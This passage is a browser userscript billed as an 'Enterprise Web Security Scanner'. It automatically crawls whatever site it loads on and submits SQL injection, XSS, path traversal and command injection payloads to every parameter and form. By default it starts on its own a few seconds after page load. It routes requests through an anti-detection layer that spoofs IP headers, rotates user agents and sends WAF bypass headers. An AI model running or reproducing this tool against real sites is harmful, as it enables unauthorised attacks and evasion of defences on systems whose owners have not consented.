                formsFound: [],
                discoveryFeed: [],
                scanConfig: {
                    maxConcurrentRequests: 3,
                    requestDelay: 1200,
                    maxPages: 75,
                    scanDepth: 3,
                    timeout: 10000,
                    autoStart: true
                }
            };

            this.antiDetect = new AdvancedAntiDetectionSystem();
            this.vulnDB = new VulnerabilityDatabase();
            this.crawler = new AdvancedCrawler(this);
            this.ui = new ScannerUI(this);
            this.activeRequests = new Set();
            this.requestQueue = [];
            this.currentConcurrent = 0;

            this.initializeScanner();
        }

        initializeScanner() {
            this.ui.createInterface();
            this.loadState();

            if (this.state.scanConfig.autoStart) {
                setTimeout(() => {
                    this.runFullAutomatedScan();
                }, 2000);
            }

            // Start human behavior simulation
            this.antiDetect.simulateHumanBehavior();
        }

        async runFullAutomatedScan() {
            if (this.state.isScanning) {
                this.addDiscovery('⚠️  Scan already in progress');
                return;
            }

            this.state.isScanning = true;
            this.state.scanStats.startTime = Date.now();
            this.state.vulnerabilities = [];
            this.state.formsFound = [];
            this.state.discoveryFeed = [];

            this.updateStatus('🚀  FULL AUTOMATED SCAN STARTED', 'scanning');

            try {
                const currentUrl = window.location.href;
                this.addDiscovery(`🎯  Starting scan of: ${currentUrl}`);

                // Phase 1: Deep Crawling
                this.addDiscovery('🔍  PHASE 1: DEEP CRAWLING');
                await this.crawler.automatedDeepCrawl(currentUrl);

                // Phase 2: Vulnerability Testing
                this.addDiscovery('⚡  PHASE 2: VULNERABILITY TESTING');
                await this.testDiscoveredEndpoints();

                // Phase 3: Security Headers Check
                this.addDiscovery('🛡️   PHASE 3: SECURITY HEADERS CHECK');
                await this.checkSecurityHeaders(currentUrl);

                // Phase 4: Generate Report
                this.addDiscovery('📊  PHASE 4: GENERATING COMPREHENSIVE REPORT');
                await this.generateComprehensiveReport();

                this.updateStatus('✅  SCAN COMPLETED SUCCESSFULLY', 'ready');
                this.state.scanStats.endTime = Date.now();

            } catch (error) {
                this.addDiscovery(`❌  Scan error: ${error.message}`);
                this.updateStatus('❌  SCAN FAILED', 'error');
            } finally {
                this.state.isScanning = false;
                this.saveState();
            }
        }

        async testDiscoveredEndpoints() {
            const endpoints = Array.from(this.crawler.visitedUrls);
            const forms = this.state.formsFound;

            this.addDiscovery(`🎯  Testing ${endpoints.length} endpoints and ${forms.length} forms`);

            // Test each endpoint
            for (const endpoint of endpoints) {
                if (!this.state.isScanning) break;

                await this.testEndpoint(endpoint);
                await this.delay(this.antiDetect.getDelayForRequest());
            }

            // Test each form
            for (const form of forms) {
                if (!this.state.isScanning) break;

                await this.testForm(form);
                await this.delay(this.antiDetect.getDelayForRequest());
            }
        }

        async testEndpoint(url) {
            try {
                // Test for SQL Injection
                await this.testSQLInjection(url);

                // Test for XSS
                await this.testXSS(url);

                // Test for Path Traversal
                await this.testPathTraversal(url);

                // Test for Command Injection
                await this.testCommandInjection(url);

            } catch (error) {
                // Continue testing other endpoints
            }
        }

        async testForm(form) {
            try {
                const testPayloads = [
                    ...this.vulnDB.payloads.sql.errorBased,
                    ...this.vulnDB.payloads.xss
                ];

                for (const payload of testPayloads) {
                    if (!this.state.isScanning) break;

                    const formData = new FormData();
                    const inputs = form.inputs || [];

                    // Fill form with payload
                    inputs.forEach(input => {
                        if (input.type !== 'submit') {
                            formData.append(input.name, payload);
                        }
                    });

                    const response = await this.makeRequest(form.action, {
                        method: form.method,
                        data: formData
                    });

                    if (response) {
                        await this.analyzeResponseForVulnerabilities(response, form.action, payload);
                    }

                    await this.delay(this.antiDetect.getDelayForRequest());
                }
            } catch (error) {
                // Continue testing other forms
            }
        }

        async testSQLInjection(url) {
            const payloads = this.vulnDB.payloads.sql.errorBased;
            for (const payload of payloads) {
                if (!this.state.isScanning) break;

                const testUrl = this.modifyUrlWithPayload(url, payload);
                const response = await this.makeRequest(testUrl);

                if (response && this.vulnDB.detectSQLInjection(response)) {
                    await this.addVulnerability({
                        type: 'SQL Injection',
                        url: testUrl,
                        payload: payload,
                        evidence: 'SQL error patterns detected in response',
                        severity: 'HIGH',
                        confidence: 0.7
                    });
                }
            }
        }

        async testXSS(url) {
            const payloads = this.vulnDB.payloads.xss;
            for (const payload of payloads) {
                if (!this.state.isScanning) break;

                const testUrl = this.modifyUrlWithPayload(url, payload);
                const response = await this.makeRequest(testUrl);

                if (response && this.vulnDB.detectXSS(response)) {
                    await this.addVulnerability({
                        type: 'Cross-Site Scripting',
                        url: testUrl,
                        payload: payload,
                        evidence: 'XSS payload reflected in response',
                        severity: 'MEDIUM',
                        confidence: 0.7
                    });
                }
            }
        }

        async testPathTraversal(url) {
            const payloads = this.vulnDB.payloads.pathTraversal;
            for (const payload of payloads) {
                if (!this.state.isScanning) break;

                const testUrl = this.modifyUrlWithPayload(url, payload);
                const response = await this.makeRequest(testUrl);

                if (response && this.vulnDB.detectPathTraversal(response)) {
                    await this.addVulnerability({
                        type: 'Path Traversal',
                        url: testUrl,
                        payload: payload,
                        evidence: 'Sensitive file content detected',
                        severity: 'MEDIUM',
                        confidence: 0.6
                    });
                }
            }
        }

        async testCommandInjection(url) {
            const payloads = this.vulnDB.payloads.command;
            for (const payload of payloads) {
                if (!this.state.isScanning) break;

                const testUrl = this.modifyUrlWithPayload(url, payload);
                const response = await this.makeRequest(testUrl);

                if (response && this.vulnDB.detectCommandInjection(response)) {
                    await this.addVulnerability({
                        type: 'Command Injection',
                        url: testUrl,
                        payload: payload,
                        evidence: 'Command execution patterns detected',
                        severity: 'HIGH',
                        confidence: 0.6
                    });
                }
            }
        }

        modifyUrlWithPayload(url, payload) {
            try {
                const urlObj = new URL(url);
                const params = new URLSearchParams(urlObj.search);
                if (params.size > 0) {
                    for (const [key] of params) {
                        params.set(key, payload);
                    }
                    urlObj.search = params.toString();
                    return urlObj.href;
                } else {
                    return `${url}${url.includes('?') ? '&' : '?'}test=${encodeURIComponent(payload)}`;
                }
            } catch (e) {
                // fallback: append a test param safely
                try {
                    return `${url}${url.includes('?') ? '&' : '?'}test=${encodeURIComponent(payload)}`;
                } catch (e2) {
                    return url;
                }
            }
        }

        async checkSecurityHeaders(url) {
            try {
                const response = await this.makeRequest(url);
                if (!response) return;

                const headers = response.responseHeaders || '';
                const missingHeaders = [];

                const requiredHeaders = [
                    'Content-Security-Policy',
                    'X-Frame-Options',
                    'X-Content-Type-Options',
                    'Strict-Transport-Security',
                    'Referrer-Policy'
                ];

                requiredHeaders.forEach(header => {
                    if (!headers.includes(header)) {
                        missingHeaders.push(header);
                    }
                });

                if (missingHeaders.length > 0) {
                    await this.addVulnerability({
                        type: 'Missing Security Headers',
                        url: url,
                        payload: 'N/A',
                        evidence: `Missing headers: ${missingHeaders.join(', ')}`,
                        severity: 'LOW',
                        confidence: 1.0
                    });
                }
            } catch (error) {
                // Continue with scan
            }
        }

        async analyzeResponseForVulnerabilities(response, url, payload) {
            const results = this.vulnDB.analyzeResponseForVulnerabilities(response, url);
            for (const result of results) {
                await this.addVulnerability({
                    type: result.type,
                    url: url,
                    payload: payload,
                    evidence: result.evidence,
                    severity: result.type === 'SQL Injection' ? 'HIGH' : 'MEDIUM',
                    confidence: result.confidence
                });
            }
        }

        async addVulnerability(vulnData) {
            const existing = this.state.vulnerabilities.find(v =>
                v.type === vulnData.type &&
                v.url === vulnData.url &&
                v.payload === vulnData.payload
            );

            if (!existing) {
                const vulnerability = {
                    id: CryptoJS.SHA256(`${vulnData.type}-${vulnData.url}-${Date.now()}`).toString(),
                    type: vulnData.type,
                    severity: vulnData.severity,
                    confidence: vulnData.confidence,
                    url: vulnData.url,
                    payload: vulnData.payload,
                    evidence: vulnData.evidence,
                    timestamp: new Date().toISOString(),
                    verificationStages: this.vulnDB.getVerificationStages(vulnData.type)
                };

                this.state.vulnerabilities.push(vulnerability);
                this.state.scanStats.vulnerabilitiesFound++;

                this.addDiscovery(`🚨  ${vulnData.type} detected at: ${vulnData.url}`);
                this.ui.updateVulnerabilityList();

                this.saveState();
            }
        }

        addDiscovery(message) {
            const timestamp = new Date().toLocaleTimeString();
            const entry = `[${timestamp}] ${message}`;
            this.state.discoveryFeed.unshift(entry);

            // Keep only last 100 entries
            if (this.state.discoveryFeed.length > 100) {
                this.state.discoveryFeed = this.state.discoveryFeed.slice(0, 100);
            }

            this.ui.updateDiscoveryFeed();
        }

        updateStatus(message, type = 'info') {
            this.ui.updateStatus(message, type);
        }

        async makeRequest(url, options = {}) {
            if (this.antiDetect.shouldThrottle()) {
                await this.delay(2000);
                return null;
            }

            const ipHeaders = this.antiDetect.rotateIP();
            const wafBypassHeaders = this.antiDetect.getWAFBypassHeaders();

            return new Promise((resolve) => {
                const requestId = Math.random().toString(36).substring(7);
                this.activeRequests.add(requestId);

                const config = {
                    method: options.method || 'GET',
                    url: url,
                    headers: Object.assign(
                        {
                            'User-Agent': this.antiDetect.getRandomUserAgent(),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Connection': 'keep-alive'
                        },
                        ipHeaders || {},
                        wafBypassHeaders || {},
                        options.headers || {}
                    ),
                    timeout: options.timeout || this.state.scanConfig.timeout,
                    onload: (response) => {
                        this.activeRequests.delete(requestId);
                        this.antiDetect.checkForWAF(response);
                        resolve(response);
                    },
                    onerror: (error) => {
                        this.activeRequests.delete(requestId);
                        this.addDiscovery(`⚠️  Request failed: ${url} - ${error.statusText}`);
                        resolve(null);
                    },
                    ontimeout: () => {
                        this.activeRequests.delete(requestId);
                        this.addDiscovery(`⏰  Request timeout: ${url}`);
                        resolve(null);
                    }
                };

                if (options.data) {
                    if (options.data instanceof FormData) {
                        config.data = options.data;
                    } else {
                        config.data = JSON.stringify(options.data);
                        config.headers['Content-Type'] = 'application/json';
                    }
                }

                try {
                    GM_xmlhttpRequest(config);
                } catch (error) {
                    this.activeRequests.delete(requestId);
                    this.addDiscovery(`❌  Request error: ${url} - ${error.message}`);
                    resolve(null);
                }
            });
        }

        analyzeForm(formElement, pageUrl) {
            const inputs = Array.from(formElement.querySelectorAll('input, textarea, select'))
                .map(input => ({
                    name: input.name || input.id || '',
                    type: input.type || 'text',
                    value: input.value || ''
                }));

            return {
                action: formElement.action ? new URL(formElement.action, pageUrl).href : pageUrl,
                method: (formElement.method || 'GET').toUpperCase(),
                inputs: inputs,
                pageUrl: pageUrl
            };
        }

        isSameDomain(url) {
            try {
                const targetUrl = new URL(url);
                const currentUrl = new URL(window.location.href);
                return targetUrl.hostname === currentUrl.hostname;
            } catch {
                return false;
            }
        }

        delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        saveState() {
            try {
                GM_setValue('scannerState', JSON.stringify(this.state));
            } catch (error) {
                // Ignore storage errors
            }
        }

        loadState() {
            try {
                const saved = GM_getValue('scannerState');
                if (saved) {
                    const parsed = JSON.parse(saved);
                    this.state = { ...this.state, ...parsed };
                }
            } catch (error) {
                // Ignore loading errors
            }
        }

        stopScan() {
            this.state.isScanning = false;
            this.activeRequests.clear();
            this.requestQueue = [];
            this.updateStatus('⏹️  SCAN STOPPED', 'warning');
        }

        async generateComprehensiveReport() {
            const report = {
                scanInfo: {
                    timestamp: new Date().toISOString(),
                    target: window.location.href,
                    duration: this.state.scanStats.endTime - this.state.scanStats.startTime,
                    pagesScanned: this.state.scanStats.pagesScanned,
                    totalVulnerabilities: this.state.vulnerabilities.length
                },
                vulnerabilities: this.state.vulnerabilities.map(v => ({
                    type: v.type,
                    severity: v.severity,
                    confidence: v.confidence,
                    url: v.url,
                    payload: v.payload,
                    evidence: v.evidence,
                    verificationStages: v.verificationStages ? v.verificationStages.map(s => ({
                        stage: s.stage,
                        name: s.name,
                        result: s.result,
                        evidence: s.evidence
                    })) : []
                })),
                statistics: {
                    bySeverity: this.state.vulnerabilities.reduce((acc, vuln) => {
                        acc[vuln.severity] = (acc[vuln.severity] || 0) + 1;
                        return acc;
                    }, {}),
                    byType: this.state.vulnerabilities.reduce((acc, vuln) => {
                        acc[vuln.type] = (acc[vuln.type] || 0) + 1;
                        return acc;
                    }, {})
                },
                recommendations: this.generateRecommendations()
            };

            // Generate HTML Report
            this.generateHTMLReport(report);

            // Generate JSON Report
            this.generateJSONReport(report);

            this.addDiscovery('📄  Comprehensive report generated and downloaded');
        }

        generateHTMLReport(reportData) {
            const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Scan Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background: #2c3e50; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .vulnerability { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
        .high { border-left: 5px solid #e74c3c; background: #ffeaea; }
        .medium { border-left: 5px solid #f39c12; background: #fff4e6; }
        .low { border-left: 5px solid #3498db; background: #e6f4ff; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }
        .stat-card { background: #ecf0f1; padding: 15px; border-radius: 5px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Security Scan Report</h1>
            <p>Generated: ${new Date(reportData.scanInfo.timestamp).toLocaleString()}</p>
            <p>Target: ${reportData.scanInfo.target}</p>
            <p>Duration: ${(reportData.scanInfo.duration / 1000).toFixed(2)} seconds</p>
        </div>

        <div class="stats">
            <div class="stat-card">
                <h3>Pages Scanned</h3>
                <p>${reportData.scanInfo.pagesScanned}</p>
            </div>
            <div class="stat-card">
                <h3>Total Vulnerabilities</h3>
                <p>${reportData.scanInfo.totalVulnerabilities}</p>
            </div>
            <div class="stat-card">
                <h3>High Severity</h3>
                <p>${reportData.statistics.bySeverity.HIGH || 0}</p>
            </div>
            <div class="stat-card">
                <h3>Medium Severity</h3>
                <p>${reportData.statistics.bySeverity.MEDIUM || 0}</p>
            </div>
        </div>

        <h2>Vulnerabilities Found</h2>
        ${reportData.vulnerabilities.map(vuln => `
            <div class="vulnerability ${vuln.severity.toLowerCase()}">
                <h3>${vuln.type} - ${vuln.severity} Severity</h3>
                <p><strong>URL:</strong> ${vuln.url}</p>
                <p><strong>Payload:</strong> <code>${vuln.payload}</code></p>
                <p><strong>Evidence:</strong> ${vuln.evidence}</p>
                <p><strong>Confidence:</strong> ${(vuln.confidence * 100).toFixed(1)}%</p>
            </div>
        `).join('')}

        <h2>Recommendations</h2>
        <ul>
            ${reportData.recommendations.map(rec => `<li>${rec}</li>`).join('')}
        </ul>
    </div>
</body>
</html>`;

            const blob = new Blob([htmlContent], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            GM_download({
                url: url,
                name: `security-scan-report-${Date.now()}.html`,
                saveAs: true
            });
        }

        generateJSONReport(reportData) {
            const jsonContent = JSON.stringify(reportData, null, 2);
            const blob = new Blob([jsonContent], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            GM_download({
                url: url,
                name: `security-scan-report-${Date.now()}.json`,
                saveAs: true
            });
        }

        generateRecommendations() {
            const recommendations = [];
            const vulnTypes = this.state.vulnerabilities.map(v => v.type);

            if (vulnTypes.includes('SQL Injection')) {
                recommendations.push('Implement parameterized queries and input validation');
                recommendations.push('Use prepared statements with bound parameters');
                recommendations.push('Apply the principle of least privilege to database accounts');
            }

            if (vulnTypes.includes('Cross-Site Scripting')) {
                recommendations.push('Implement Content Security Policy (CSP) headers');
                recommendations.push('Use output encoding for user-generated content');
                recommendations.push('Validate and sanitize all user inputs');
            }

            if (vulnTypes.includes('Command Injection')) {
                recommendations.push('Avoid using user input in system commands');
                recommendations.push('Use built-in language functions instead of shell commands');
                recommendations.push('Implement strict input validation for command parameters');
            }

            if (vulnTypes.includes('Path Traversal')) {
                recommendations.push('Validate and sanitize file path inputs');
                recommendations.push('Use whitelists for allowed file directories');
                recommendations.push('Implement proper access controls for file access');
            }

            if (this.state.vulnerabilities.some(v => v.type === 'Missing Security Headers')) {
                recommendations.push('Implement missing security headers (CSP, HSTS, X-Frame-Options, etc.)');
            }

            return recommendations;
        }

        calculateContentDifference(original, modified) {
            if (!original || !modified) return 0;
            const orig = original.responseText || '';
            const mod = modified.responseText || '';
            const maxLength = Math.max(orig.length, mod.length);
            if (maxLength === 0) return 0;

            let differences = 0;
            for (let i = 0; i < maxLength; i++) {
                if (orig[i] !== mod[i]) {
                    differences++;
                }
            }
            return differences / maxLength;
        }
    }

    // ==============================
    // SCANNER UI
    // ==============================
    class ScannerUI {
        constructor(scanner) {
            this.scanner = scanner;
            this.container = null;
            this.createInterface();
        }

        createInterface() {
            // Remove existing interface if present
            const existing = document.getElementById('security-scanner-ui');
            if (existing) existing.remove();

            // Create main container
            this.container = document.createElement('div');
            this.container.id = 'security-scanner-ui';
            this.container.innerHTML = this.getUIHTML();
            document.body.appendChild(this.container);

            this.attachEventListeners();
            this.applyStyles();
        }

        getUIHTML() {
            return `
<div class="scanner-container">
    <div class="scanner-header">
        <h2>🛡️ Enterprise Web Security Scanner v7.0</h2>
        <div class="status-indicator" id="statusIndicator">Ready</div>
    </div>

    <div class="control-panel">
        <button id="startScan" class="btn btn-primary">Start Full Scan</button>
        <button id="stopScan" class="btn btn-danger">Stop Scan</button>
        <button id="generateReport" class="btn btn-secondary">Generate Report</button>
        <button id="toggleUI" class="btn btn-info">Toggle UI</button>
    </div>

    <div class="stats-panel">
        <div class="stat-card">
            <span class="stat-label">Pages Scanned</span>
            <span class="stat-value" id="pagesScanned">0</span>
        </div>
        <div class="stat-card">
            <span class="stat-label">Vulnerabilities</span>
            <span class="stat-value" id="vulnerabilitiesFound">0</span>
        </div>
        <div class="stat-card">
            <span class="stat-label">Scan Time</span>
            <span class="stat-value" id="scanTime">0s</span>
        </div>
        <div class="stat-card">
            <span class="stat-label">Status</span>
            <span class="stat-value" id="scanStatus">Ready</span>
        </div>
    </div>

    <div class="tabs">
        <button class="tab-button active" data-tab="discovery">Discovery Feed</button>
        <button class="tab-button" data-tab="vulnerabilities">Vulnerabilities</button>
        <button class="tab-button" data-tab="forms">Forms Found</button>
        <button class="tab-button" data-tab="config">Configuration</button>
    </div>

    <div class="tab-content">
        <div id="discovery-tab" class="tab-pane active">
            <div class="discovery-feed" id="discoveryFeed">
                <!-- Discovery messages will appear here -->
            </div>
        </div>

        <div id="vulnerabilities-tab" class="tab-pane">
            <div class="vulnerability-list" id="vulnerabilityList">
                <!-- Vulnerabilities will appear here -->
            </div>
        </div>

        <div id="forms-tab" class="tab-pane">
            <div class="forms-list" id="formsList">
                <!-- Forms will appear here -->
            </div>
        </div>

        <div id="config-tab" class="tab-pane">
            <div class="config-panel">
                <h3>Scan Configuration</h3>
                <div class="config-item">
                    <label>Max Pages:</label>
                    <input type="number" id="maxPages" value="${this.scanner.state.scanConfig.maxPages}" min="1" max="200">
                </div>
                <div class="config-item">
                    <label>Scan Depth:</label>
                    <input type="number" id="scanDepth" value="${this.scanner.state.scanConfig.scanDepth}" min="1" max="5">
                </div>
                <div class="config-item">
                    <label>Request Delay (ms):</label>
                    <input type="number" id="requestDelay" value="${this.scanner.state.scanConfig.requestDelay}" min="500" max="5000">
                </div>
                <div class="config-item">
                    <label>Auto Start:</label>
                    <input type="checkbox" id="autoStart" ${this.scanner.state.scanConfig.autoStart ? 'checked' : ''}>
                </div>
                <button id="saveConfig" class="btn btn-primary">Save Configuration</button>
            </div>
        </div>
    </div>
</div>`;
        }

        applyStyles() {
            const styles = `
#security-scanner-ui {
    position: fixed;
    top: 10px;
    right: 10px;
    width: 450px;
    max-height: 80vh;
    background: #2c3e50;
    color: white;
    border-radius: 10px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
    z-index: 10000;
    font-family: Arial, sans-serif;
    font-size: 12px;
    overflow: hidden;
}

.scanner-container {
    display: flex;
    flex-direction: column;
    height: 100%;
}

.scanner-header {
    background: #34495e;
    padding: 15px;
    border-radius: 10px 10px 0 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.scanner-header h2 {
    margin: 0;
    font-size: 14px;
    color: #ecf0f1;
}

.status-indicator {
    padding: 4px 8px;
    border-radius: 12px;
    font-size: 10px;
    font-weight: bold;
}

.status-ready { background: #27ae60; }
.status-scanning { background: #f39c12; }
.status-error { background: #e74c3c; }
.status-warning { background: #e67e22; }

.control-panel {
    padding: 15px;
    background: #34495e;
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
}

.btn {
    padding: 6px 12px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 11px;
    font-weight: bold;
    transition: all 0.3s ease;
}

.btn-primary { background: #3498db; color: white; }
.btn-danger { background: #e74c3c; color: white; }
.btn-secondary { background: #95a5a6; color: white; }
.btn-info { background: #1abc9c; color: white; }

.btn:hover { opacity: 0.9; transform: translateY(-1px); }

.stats-panel {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 8px;
    padding: 10px;
    background: #34495e;
}

.stat-card {
    background: #2c3e50;
    padding: 8px;
    border-radius: 4px;
    text-align: center;
}

.stat-label {
    display: block;
    font-size: 9px;
    color: #bdc3c7;
}

.stat-value {
    display: block;
    font-size: 14px;
    font-weight: bold;
    color: #ecf0f1;
}

.tabs {
    display: flex;
    background: #34495e;
    border-bottom: 1px solid #4a6278;
}

.tab-button {
    flex: 1;
    padding: 8px;
    background: none;
    border: none;
    color: #bdc3c7;
    cursor: pointer;
    font-size: 10px;
    transition: all 0.3s ease;
}

.tab-button.active {
    background: #3498db;
    color: white;
}

.tab-content {
    flex: 1;
    overflow: auto;
    background: #2c3e50;
}

.tab-pane {
    display: none;
    padding: 10px;
    max-height: 300px;
    overflow-y: auto;
}

.tab-pane.active {
    display: block;
}

.discovery-feed {
    font-family: 'Courier New', monospace;
    font-size: 10px;
}

.discovery-entry {
    padding: 4px 0;
    border-bottom: 1px solid #34495e;
    color: #ecf0f1;
}

.vulnerability-item {
    background: #34495e;
    margin: 5px 0;
    padding: 8px;
    border-radius: 4px;
    border-left: 3px solid;
}

.vulnerability-high { border-left-color: #e74c3c; }
.vulnerability-medium { border-left-color: #f39c12; }
.vulnerability-low { border-left-color: #3498db; }

.vulnerability-type {
    font-weight: bold;
    font-size: 11px;
}

.vulnerability-url {
    font-size: 9px;
    color: #bdc3c7;
    word-break: break-all;
}

.forms-list {
    font-size: 10px;
}

.form-item {
    background: #34495e;
    margin: 5px 0;
    padding: 8px;
    border-radius: 4px;
}

.config-item {
    margin: 8px 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.config-item label {
    font-size: 10px;
    color: #bdc3c7;
}

.config-item input {
    background: #34495e;
    border: 1px solid #4a6278;
    color: white;
    padding: 4px;
    border-radius: 3px;
    width: 60px;
}

/* Scrollbar styling */
.tab-pane::-webkit-scrollbar {
    width: 6px;
}

.tab-pane::-webkit-scrollbar-track {
    background: #34495e;
}

.tab-pane::-webkit-scrollbar-thumb {
    background: #4a6278;
    border-radius: 3px;
}

.tab-pane::-webkit-scrollbar-thumb:hover {
    background: #5a7288;
}
`;

            const styleElement = document.createElement('style');
            styleElement.textContent = styles;
            document.head.appendChild(styleElement);
        }

        attachEventListeners() {
            // Tab switching
            document.querySelectorAll('.tab-button').forEach(button => {
                button.addEventListener('click', (e) => {
                    const tabName = e.target.getAttribute('data-tab');
                    this.switchTab(tabName);
                });
            });

            // Control buttons
            document.getElementById('startScan').addEventListener('click', () => {
                this.scanner.runFullAutomatedScan();
            });

            document.getElementById('stopScan').addEventListener('click', () => {
                this.scanner.stopScan();
            });

            document.getElementById('generateReport').addEventListener('click', () => {
                this.scanner.generateComprehensiveReport();
            });

            document.getElementById('toggleUI').addEventListener('click', () => {
                this.container.style.display = this.container.style.display === 'none' ? 'block' : 'none';
            });

            document.getElementById('saveConfig').addEventListener('click', () => {
                this.saveConfiguration();
            });
        }

        switchTab(tabName) {
            // Update tab buttons
            document.querySelectorAll('.tab-button').forEach(button => {
                button.classList.toggle('active', button.getAttribute('data-tab') === tabName);
            });

            // Update tab panes
            document.querySelectorAll('.tab-pane').forEach(pane => {
                pane.classList.toggle('active', pane.id === `${tabName}-tab`);
            });

            // Refresh content if needed
            if (tabName === 'vulnerabilities') {
                this.updateVulnerabilityList();
            } else if (tabName === 'forms') {
                this.updateFormsList();
            }
        }

        updateStatus(message, type = 'info') {
            const indicator = document.getElementById('statusIndicator');
            const statusElement = document.getElementById('scanStatus');

            if (indicator) {
                indicator.textContent = message;
                indicator.className = `status-indicator status-${type}`;
            }

            if (statusElement) {
                statusElement.textContent = message;
            }
        }

        updateDiscoveryFeed() {
            const feed = document.getElementById('discoveryFeed');
            if (!feed) return;

            feed.innerHTML = this.scanner.state.discoveryFeed
                .map(entry => `<div class="discovery-entry">${entry}</div>`)
                .join('');
        }

        updateVulnerabilityList() {
            const list = document.getElementById('vulnerabilityList');
            if (!list) return;

            list.innerHTML = this.scanner.state.vulnerabilities
                .map(vuln => `
                    <div class="vulnerability-item vulnerability-${vuln.severity.toLowerCase()}">
                        <div class="vulnerability-type">${vuln.type} - ${vuln.severity}</div>
                        <div class="vulnerability-url">${vuln.url}</div>
                        <div class="vulnerability-confidence">Confidence: ${(vuln.confidence * 100).toFixed(1)}%</div>
                    </div>
                `)
                .join('');
        }

        updateFormsList() {
            const list = document.getElementById('formsList');
            if (!list) return;

            list.innerHTML = this.scanner.state.formsFound
                .map(form => `
                    <div class="form-item">
                        <div><strong>Action:</strong> ${form.action}</div>
                        <div><strong>Method:</strong> ${form.method}</div>
                        <div><strong>Inputs:</strong> ${form.inputs.length}</div>
                    </div>
                `)
                .join('');
        }

        saveConfiguration() {
            this.scanner.state.scanConfig.maxPages = parseInt(document.getElementById('maxPages').value) || 75;
            this.scanner.state.scanConfig.scanDepth = parseInt(document.getElementById('scanDepth').value) || 3;
            this.scanner.state.scanConfig.requestDelay = parseInt(document.getElementById('requestDelay').value) || 1200;
            this.scanner.state.scanConfig.autoStart = document.getElementById('autoStart').checked;

            this.scanner.saveState();
            this.scanner.addDiscovery('✅  Configuration saved');
        }

        updateStats() {
            document.getElementById('pagesScanned').textContent = this.scanner.state.scanStats.pagesScanned;
            document.getElementById('vulnerabilitiesFound').textContent = this.scanner.state.scanStats.vulnerabilitiesFound;

            if (this.scanner.state.scanStats.startTime) {
                const duration = Math.floor((Date.now() - this.scanner.state.scanStats.startTime) / 1000);
                document.getElementById('scanTime').textContent = `${duration}s`;
            }
        }
    }

    // ==============================
    // INITIALIZATION
    // ==============================
    let scannerInstance = null;

    function initializeScanner() {
        if (!scannerInstance) {
            scannerInstance = new EnterpriseWebSecurityScanner();
        }
        return scannerInstance;
    }

    // Wait for page to load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeScanner);
    } else {
        initializeScanner();
    }

    // Export for debugging
    window.SecurityScanner = initializeScanner;
})();